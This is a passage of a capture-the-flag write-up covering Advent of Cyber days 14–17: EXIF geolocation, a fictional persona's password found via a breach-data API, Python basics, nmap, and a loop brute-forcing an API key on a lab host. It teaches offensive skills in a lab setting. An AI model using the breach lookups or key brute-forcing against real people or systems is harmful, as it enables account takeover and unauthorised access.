style="color:#F8F8F2"><span class="token plain">--2020-12-14 11:31:29--  https://tcm-sec.com/wp-content/uploads/2020/11/lights-festival-website.jpg</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Resolving tcm-sec.com (tcm-sec.com)... 70.32.23.61</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Connecting to tcm-sec.com (tcm-sec.com)|70.32.23.61|:443... connected.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">HTTP request sent, awaiting response... 200 OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Length: 51161 (50K) [image/jpeg]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Saving to: ‘lights-festival-website.jpg’</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lights-festival-website.jpg                             100%[============================================================================================================================&gt;]  49.96K  --.-KB/s    in 0.07s   </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2020-12-14 11:31:29 (693 KB/s) - ‘lights-festival-website.jpg’ saved [51161/51161]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bluemoon@dragonfly:~/ctf/thm/thm-advent/day14-wheres-rudolph$ exiftool lights-festival-website.jpg </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ExifTool Version Number         : 11.88</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">File Name                       : lights-festival-website.jpg</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Directory                       : .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">File Size                       : 50 kB</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">File Modification Date/Time     : 2020:11:25 10:07:43-05:00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">File Access Date/Time           : 2020:12:14 11:32:24-05:00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">File Inode Change Date/Time     : 2020:12:14 11:31:29-05:00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">File Permissions                : rw-rw-r--</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">File Type                       : JPEG</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">File Type Extension             : jpg</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">MIME Type                       : image/jpeg</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">JFIF Version                    : 1.01</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">X Resolution                    : 72</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Y Resolution                    : 72</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Exif Byte Order                 : Big-endian (Motorola, MM)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Resolution Unit                 : inches</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Y Cb Cr Positioning             : Centered</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Copyright                       : {FLAG}ALWAYSCHECKTHEEXIFD4T4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Exif Version                    : 0231</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Components Configuration        : Y, Cb, Cr, -</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">User Comment                    : Hi. :)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Flashpix Version                : 0100</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">GPS Latitude Ref                : North</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">GPS Longitude Ref               : West</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Image Width                     : 650</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Image Height                    : 510</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Encoding Process                : Baseline DCT, Huffman coding</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Bits Per Sample                 : 8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Color Components                : 3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Image Size                      : 650x510</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Megapixels                      : 0.332</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">GPS Latitude                    : 41 deg 53&#x27; 30.53&quot; N</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">GPS Longitude                   : 87 deg 37&#x27; 27.40&quot; W</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">GPS Position                    : 41 deg 53&#x27; 30.53&quot; N, 87 deg 37&#x27; 27.40&quot; W</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can find the coordinates of the photo to be <code>41.891815, -87.624277</code>.  </p><p>Ooh, we also find a flag!</p><p>Flag: <code>{FLAG}ALWAYSCHECKTHEEXIFD4T4</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="finding-rudolphs-password">Finding Rudolph&#x27;s Password<a href="#finding-rudolphs-password" class="hash-link" aria-label="Direct link to Finding Rudolph&#x27;s Password" title="Direct link to Finding Rudolph&#x27;s Password">​</a></h3><p>On Rudolph&#x27;s Twitter, we find his email: <code>rudolphthered@hotmail.com</code>  </p><p>We can use <code>https://scylla.sh/api</code> to find a password. <code>rudolphthered@hotmail.com:spygame</code>.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="finding-rudolphs-location">Finding Rudolph&#x27;s location<a href="#finding-rudolphs-location" class="hash-link" aria-label="Direct link to Finding Rudolph&#x27;s location" title="Direct link to Finding Rudolph&#x27;s location">​</a></h3><p>We can use <a href="https://www.google.com/maps/place/41%C2%B053&#x27;30.5%22N+87%C2%B037&#x27;27.4%22W/@41.8918056,-87.6264665,17z/data=!3m1!4b1!4m5!3m4!1s0x0:0x0!8m2!3d41.8918056!4d-87.6242778" target="_blank" rel="noopener noreferrer">Google Maps</a> and the coordinates to find the Hotel that Rudolph is in.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/google_maps-a7d072a97d921c6af661ecb924fbcdf5.png" width="1600" height="772" class="img_ev3q"></p><p><img loading="lazy" alt="screenshot" src="/assets/images/apple_maps-811a6866bc791d13663385e050371fa9.png" width="1170" height="2532" class="img_ev3q"></p><p>Turns out, the address for the hotel is <code>540 North Michigan Avenue, Chicago, Illinois 60611 USA</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-15-theres-a-python-in-my-stocking">Day 15: There&#x27;s a Python in my stocking!<a href="#day-15-theres-a-python-in-my-stocking" class="hash-link" aria-label="Direct link to Day 15: There&#x27;s a Python in my stocking!" title="Direct link to Day 15: There&#x27;s a Python in my stocking!">​</a></h2><p><em>Category: Scripting</em><br>
<em>Tags: Python</em></p><blockquote><p>Utilise Santa&#x27;s favourite type of snake: Pythons to become a scripting master expert!</p></blockquote><h3 class="anchor anchorWithStickyNavbar_LWe7" id="whats-the-output-of-true--true">What&#x27;s the output of <code>True + True</code>?<a href="#whats-the-output-of-true--true" class="hash-link" aria-label="Direct link to whats-the-output-of-true--true" title="Direct link to whats-the-output-of-true--true">​</a></h3><p>Since the value of True is 1 and 1 + 1 == 2, the Python interpreter says that <code>True + True == 2</code></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">&gt;&gt;&gt; True + True</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="whats-the-database-for-installing-other-peoples-libraries-called">What&#x27;s the database for installing other peoples libraries called?<a href="#whats-the-database-for-installing-other-peoples-libraries-called" class="hash-link" aria-label="Direct link to What&#x27;s the database for installing other peoples libraries called?" title="Direct link to What&#x27;s the database for installing other peoples libraries called?">​</a></h3><p>The <a href="https://pypi.org/" target="_blank" rel="noopener noreferrer">Python Package Index (PyPi)</a> is the database connected to <code>pip</code>/<code>pip3</code>.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-the-output-of-boolfalse">What is the output of bool(&quot;False&quot;)?<a href="#what-is-the-output-of-boolfalse" class="hash-link" aria-label="Direct link to What is the output of bool(&quot;False&quot;)?" title="Direct link to What is the output of bool(&quot;False&quot;)?">​</a></h3><p><code>&quot;False&quot;</code> is actually a string and the boolean representation of a string is <code>True</code></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">&gt;&gt;&gt; bool(&quot;False&quot;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">True</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="what-library-lets-us-download-the-html-of-a-webpage">What library lets us download the HTML of a webpage?<a href="#what-library-lets-us-download-the-html-of-a-webpage" class="hash-link" aria-label="Direct link to What library lets us download the HTML of a webpage?" title="Direct link to What library lets us download the HTML of a webpage?">​</a></h3><p>The <code>requests</code> library allows us to send HTTP requests in Python.</p><p>It can be installed by running <code>pip3 install requests</code>.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-the-output-of-the-program-provided-in-code-to-analyse-for-question-5-in-todays-material">What is the output of the program provided in &quot;Code to analyse for Question 5&quot; in today&#x27;s material?<a href="#what-is-the-output-of-the-program-provided-in-code-to-analyse-for-question-5-in-todays-material" class="hash-link" aria-label="Direct link to What is the output of the program provided in &quot;Code to analyse for Question 5&quot; in today&#x27;s material?" title="Direct link to What is the output of the program provided in &quot;Code to analyse for Question 5&quot; in today&#x27;s material?">​</a></h3><p>Easiest way to find out is just to run it.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">bluemoon@dragonfly:~/ctf/thm/thm-advent/day15-theres-a-python-in-my-stocking$ python3 script.py </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[1, 2, 3, 6]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="what-causes-the-previous-task-to-output-that">What causes the previous task to output that?<a href="#what-causes-the-previous-task-to-output-that" class="hash-link" aria-label="Direct link to What causes the previous task to output that?" title="Direct link to What causes the previous task to output that?">​</a></h4><p>In Python, and many other languages, lists are just a pointer to an address in memory and when we set one list equal to another we are pointing to the same list in memory. This is called <code>pass by reference</code>.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-16-help-where-is-santa">Day 16: Help! Where is Santa?<a href="#day-16-help-where-is-santa" class="hash-link" aria-label="Direct link to Day 16: Help! Where is Santa?" title="Direct link to Day 16: Help! Where is Santa?">​</a></h2><p><em>Category: Scripting</em><br>
<em>Tags: Requests</em></p><blockquote><p>Santa appears to have accidentally told Rudolph to take off, leaving the elves stranded! Utilise Python and the power of APIs to track where Santa is, and help the elves get back to their sleigh!</p></blockquote><p>IP: <code>10.10.135.149</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="basic-enumeration-7">Basic enumeration<a href="#basic-enumeration-7" class="hash-link" aria-label="Direct link to Basic enumeration" title="Direct link to Basic enumeration">​</a></h3><p>Firstly, let&#x27;s run the Nmap scan!</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">nmap -sC -sV -vvv -oN nmap.log 10.10.135.149</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We see that the web server is running on port <code>8000</code>.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="visiting-the-webpage">Visiting the webpage<a href="#visiting-the-webpage" class="hash-link" aria-label="Direct link to Visiting the webpage" title="Direct link to Visiting the webpage">​</a></h3><p>We type <code>http://10.10.135.149:8000/static/index.html</code> into the webpage and we find the following.</p><p><img loading="lazy" alt="screenshot" src="/assets/images/index-616729698572cbfddd90d2abbcf3fb40.png" width="1918" height="938" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="finding-santas-location">Finding Santa&#x27;s Location<a href="#finding-santas-location" class="hash-link" aria-label="Direct link to Finding Santa&#x27;s Location" title="Direct link to Finding Santa&#x27;s Location">​</a></h3><p>Well, we could just view the page source to find the correct link, I reckon we could do it much easier in with Python.</p><div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> requests </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">as</span><span class="token plain"> r</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> bs4 </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> BeautifulSoup</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">url </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;http://10.10.135.149:8000&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">page </span><span class="token operator">=</span><span class="token plain"> r</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">get</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">url</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">page </span><span class="token operator">=</span><span class="token plain"> BeautifulSoup</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">page</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">text</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;html.parser&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">links </span><span class="token operator">=</span><span class="token plain"> page</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">find_all</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;a&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> i </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> links</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> i</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">get</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;href&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">not</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;#&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;https://tryhackme.com&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">i</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">get</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;href&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We find that the secret link is <code>http://machine_ip/api/api_key</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="finding-the-api-endpoint">Finding the API endpoint<a href="#finding-the-api-endpoint" class="hash-link" aria-label="Direct link to Finding the API endpoint" title="Direct link to Finding the API endpoint">​</a></h3><p>We can find the API endpoint at <code>10.10.135.149:8000/api/</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="finding-santas-location-1">Finding Santa&#x27;s Location<a href="#finding-santas-location-1" class="hash-link" aria-label="Direct link to Finding Santa&#x27;s Location" title="Direct link to Finding Santa&#x27;s Location">​</a></h3><p>To find the API key, I wrote a simple Python script.</p><div class="language-py codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-py codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> requests </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">as</span><span class="token plain"> r</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">url </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;http://10.10.135.149:8000/api/&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> i </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">range</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">100</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    response </span><span class="token operator">=</span><span class="token plain"> r</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">get</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">url </span><span class="token operator">+</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">i</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;Error. Key not valid!&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">not</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> response</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">text</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f&quot;API Key: </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">response</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">text</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And we get the following output:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">API Key: 57</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">{&quot;item_id&quot;:57,&quot;q&quot;:&quot;Winter Wonderland, Hyde Park, London.&quot;}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-17-reverseelfneering">Day 17: ReverseELFneering<a href="#day-17-reverseelfneering" class="hash-link" aria-label="Direct link to Day 17: ReverseELFneering" title="Direct link to Day 17: ReverseELFneering">​</a></h2><p><em>Category: Reverse Engineering</em><br>
<em>Tags: GDB, Linux</em></p><blockquote><p>Learn the basics of assembly and reverse engineer your first application!</p></blockquote><p>IP: <code>10.10.197.43</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-started">Getting started<a href="#getting-started" class="hash-link" aria-label="Direct link to Getting started" title="Direct link to Getting started">​</a></h3><p>We are given the following credentials: <code>elfmceager:adventofcyber</code>. We can either work on the target instance using SSH or pull the files using SCP and work on our own machine.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ssh elfmceager@10.10.197.43</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 